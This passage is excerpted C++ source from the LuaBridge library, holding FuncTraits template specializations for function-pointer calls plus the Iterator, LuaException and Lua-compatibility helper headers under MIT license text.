  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6> > > > > > Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class P6, class P7, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5, P6, P7), D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6, TypeList <P7> > > > > > > Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class P6, class P7, class P8, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5, P6, P7, P8), D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6, TypeList <P7, TypeList <P8> > > > > > > > Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.tl.hd);
  }
};

/* Const member function pointers. */

template <class T, class R, class D>
struct FuncTraits <R (T::*) () const, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef None Params;
  static R call (T const* obj, D fp, TypeListValues <Params>)
  {
    return (obj->*fp)();
  }
};

template <class T, class R, class P1, class D>
struct FuncTraits <R (T::*) (P1) const, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1> Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd);
  }
};

template <class T, class R, class P1, class P2, class D>
struct FuncTraits <R (T::*) (P1, P2) const, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2> > Params;
  static R call (T const* obj, R (T::*fp) (P1, P2) const,
    TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class D>
struct FuncTraits <R (T::*) (P1, P2, P3) const, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3> > > Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4) const, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4> > > > Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5) const, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5> > > > > Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class P6, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5, P6) const, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6> > > > > > Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class P6, class P7, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5, P6, P7) const, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6, TypeList <P7> > > > > > > Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class P6, class P7, class P8, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5, P6, P7, P8) const, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6, TypeList <P7, TypeList <P8> > > > > > > > Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.tl.hd);
  }
};

#if defined (LUABRIDGE_THROWSPEC)

/* Ordinary function pointers. */

template <class R, class D>
struct FuncTraits <R (*) () LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef None Params;
  static R call (D fp, TypeListValues <Params> const&)
  {
    return fp ();
  }
};

template <class R, class P1, class D>
struct FuncTraits <R (*) (P1) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1> Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd);
  }
};

template <class R, class P1, class P2, class D>
struct FuncTraits <R (*) (P1, P2) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2> > Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd, tvl.tl.hd);
  }
};

template <class R, class P1, class P2, class P3, class D>
struct FuncTraits <R (*) (P1, P2, P3) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3> > > Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd, tvl.tl.hd, tvl.tl.tl.hd);
  }
};

template <class R, class P1, class P2, class P3, class P4, class D>
struct FuncTraits <R (*) (P1, P2, P3, P4) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4> > > > Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd);
  }
};

template <class R, class P1, class P2, class P3, class P4, class P5, class D>
struct FuncTraits <R (*) (P1, P2, P3, P4, P5) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5> > > > > Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd);
  }
};

template <class R, class P1, class P2, class P3, class P4, class P5, class P6, class D>
struct FuncTraits <R (*) (P1, P2, P3, P4, P5, P6) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5,  TypeList <P6> > > > > > Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd);
  }
};

template <class R, class P1, class P2, class P3, class P4, class P5, class P6, class P7, class D>
struct FuncTraits <R (*) (P1, P2, P3, P4, P5, P6, P7) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6, TypeList <P7> > > > > > > Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.hd);
  }
};

template <class R, class P1, class P2, class P3, class P4, class P5, class P6, class P7, class P8, class D>
struct FuncTraits <R (*) (P1, P2, P3, P4, P5, P6, P7, P8) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = false;
  typedef D DeclType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6, TypeList <P7, TypeList <P8> > > > > > > > Params;
  static R call (D fp, TypeListValues <Params> tvl)
  {
    return fp (tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.tl.hd);
  }
};

/* Non-const member function pointers with THROWSPEC. */

template <class T, class R, class D>
struct FuncTraits <R (T::*) () LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef None Params;
  static R call (T* obj, D fp, TypeListValues <Params> const&)
  {
    return (obj->*fp)();
  }
};

template <class T, class R, class P1, class D>
struct FuncTraits <R (T::*) (P1) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1> Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd);
  }
};

template <class T, class R, class P1, class P2, class D>
struct FuncTraits <R (T::*) (P1, P2) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2> > Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class D>
struct FuncTraits <R (T::*) (P1, P2, P3) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3> > > Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4> > > > Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5> > > > > Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class P6, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5, P6) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6> > > > > > Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class P6, class P7, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5, P6, P7) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6, TypeList <P7> > > > > > > Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class P6, class P7, class P8, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5, P6, P7, P8) LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = false;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6, TypeList <P7, TypeList <P8> > > > > > > > Params;
  static R call (T* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.tl.hd);
  }
};

/* Const member function pointers with THROWSPEC. */

template <class T, class R, class D>
struct FuncTraits <R (T::*) () const LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef None Params;
  static R call (T const* obj, D fp, TypeListValues <Params>)
  {
    return (obj->*fp)();
  }
};

template <class T, class R, class P1, class D>
struct FuncTraits <R (T::*) (P1) const LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1> Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd);
  }
};

template <class T, class R, class P1, class P2, class D>
struct FuncTraits <R (T::*) (P1, P2) const LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2> > Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class D>
struct FuncTraits <R (T::*) (P1, P2, P3) const LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3> > > Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4) const LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4> > > > Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5) const LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5> > > > > Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd,
      tvl.tl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class P6, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5, P6) const LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6> > > > > > Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class P6, class P7, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5, P6, P7) const LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6, TypeList <P7> > > > > > > Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.hd);
  }
};

template <class T, class R, class P1, class P2, class P3, class P4, class P5, class P6, class P7, class P8, class D>
struct FuncTraits <R (T::*) (P1, P2, P3, P4, P5, P6, P7, P8) const LUABRIDGE_THROWSPEC, D>
{
  static bool const isMemberFunction = true;
  static bool const isConstMemberFunction = true;
  typedef D DeclType;
  typedef T ClassType;
  typedef R ReturnType;
  typedef TypeList <P1, TypeList <P2, TypeList <P3, TypeList <P4, TypeList <P5, TypeList <P6, TypeList <P7, TypeList <P8> > > > > > > > Params;
  static R call (T const* obj, D fp, TypeListValues <Params> tvl)
  {
    return (obj->*fp)(tvl.hd, tvl.tl.hd, tvl.tl.tl.hd, tvl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.hd, tvl.tl.tl.tl.tl.tl.tl.tl.hd);
  }
};

#endif

```

`libs/LuaBridge/detail/Iterator.h`:

```h
//------------------------------------------------------------------------------
/*
  https://github.com/vinniefalco/LuaBridge
  
  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
//==============================================================================

/** Allows table iteration.
*/
class Iterator
{
private:
  lua_State* m_L;
  LuaRef m_table;
  LuaRef m_key;
  LuaRef m_value;

  void next ()
  {
    m_table.push(m_L);
    m_key.push (m_L);
    if (lua_next (m_L, -2))
    {
      m_value.pop (m_L);
      m_key.pop (m_L);
    }
    else
    {
      m_key = Nil();
      m_value = Nil();
    }
    lua_pop(m_L, 1);
  }

public:
  explicit Iterator (LuaRef table)
    : m_L (table.state ())
    , m_table (table)
    , m_key (table.state ()) // m_key is nil
    , m_value (table.state ()) // m_value is nil
  {
    next (); // get the first (key, value) pair from table
  }

  lua_State* state () const
  {
    return m_L;
  }

  LuaRef operator* () const
  {
    return m_value;
  }

  LuaRef operator-> () const
  {
    return m_value;
  }

  Iterator& operator++ ()
  {
    if (isNil())
    {
      // if the iterator reaches the end, do nothing
      return *this;
    }
    else
    {
      next();
      return *this;
    }
  }

  inline bool isNil () const
  {
    return m_key.isNil ();
  }

  inline LuaRef key () const
  {
    return m_key;
  }

  inline LuaRef value () const
  {
    return m_value;
  }

private:
  // Don't use postfix increment, it is less efficient
  Iterator operator++ (int);
};


```

`libs/LuaBridge/detail/LuaException.h`:

```h
//------------------------------------------------------------------------------
/*
  https://github.com/vinniefalco/LuaBridge
  
  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>
  Copyright 2008, Nigel Atkinson <suprapilot+LuaCode@gmail.com>

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
//==============================================================================

class LuaException : public std::exception 
{
private:
  lua_State* m_L;
  std::string m_what;

public:
  //----------------------------------------------------------------------------
  /**
      Construct a LuaException after a lua_pcall().
  */
  LuaException (lua_State* L, int /*code*/)
    : m_L (L)
  {
    whatFromStack ();
  }

  //----------------------------------------------------------------------------

  LuaException (lua_State *L,
                char const*,
                char const*,
                long)
    : m_L (L)
  {
    whatFromStack ();
  }

  //----------------------------------------------------------------------------

  ~LuaException() throw ()
  {
  }

  //----------------------------------------------------------------------------

  char const* what() const throw ()
  {
    return m_what.c_str();
  }

  //============================================================================
  /**
      Throw an exception.

      This centralizes all the exceptions thrown, so that we can set
      breakpoints before the stack is unwound, or otherwise customize the
      behavior.
  */
  template <class Exception>
  static void Throw (Exception e)
  {
    throw e;
  }

  //----------------------------------------------------------------------------
  /**
      Wrapper for lua_pcall that throws.
  */
  static void pcall (lua_State* L, int nargs = 0, int nresults = 0, int msgh = 0)
  {
    int code = lua_pcall (L, nargs, nresults, msgh);

    if (code != LUABRIDGE_LUA_OK)
      Throw (LuaException (L, code));
  }

  //----------------------------------------------------------------------------

protected:
  void whatFromStack ()
  {
    if (lua_gettop (m_L) > 0)
    {
      char const* s = lua_tostring (m_L, -1);
      m_what = s ? s : "";
    }
    else
    {
      // stack is empty
      m_what = "missing error";
    }
  }
};

```

`libs/LuaBridge/detail/LuaHelpers.h`:

```h
//------------------------------------------------------------------------------
/*
  https://github.com/vinniefalco/LuaBridge
  
  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>
  Copyright 2007, Nathan Reed

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
//==============================================================================

// These are for Lua versions prior to 5.2.0.
//
#if LUA_VERSION_NUM < 502
inline int lua_absindex (lua_State* L, int idx)
{
  if (idx > LUA_REGISTRYINDEX && idx < 0)
    return lua_gettop (L) + idx + 1;
  else
    return idx;
}

inline void lua_rawgetp (lua_State* L, int idx, void const* p)
{
  idx = lua_absindex (L, idx);
  lua_pushlightuserdata (L, const_cast <void*> (p));
  lua_rawget (L,idx);
}

inline void lua_rawsetp (lua_State* L, int idx, void const* p)
{
  idx = lua_absindex (L, idx);
  lua_pushlightuserdata (L, const_cast <void*> (p));
  // put key behind value
  lua_insert (L, -2);
  lua_rawset (L, idx);
}

#define LUA_OPEQ 1
#define LUA_OPLT 2
#define LUA_OPLE 3

inline int lua_compare (lua_State* L, int idx1, int idx2, int op)
{
  switch (op)
  {
  case LUA_OPEQ:
    return lua_equal (L, idx1, idx2);
    break;

  case LUA_OPLT:
    return lua_lessthan (L, idx1, idx2);
    break;

  case LUA_OPLE:
    return lua_equal (L, idx1, idx2) || lua_lessthan (L, idx1, idx2);
    break;

  default:
    return 0;
  };
}

inline int get_length (lua_State* L, int idx)
{
  return int (lua_objlen (L, idx));
}

#else
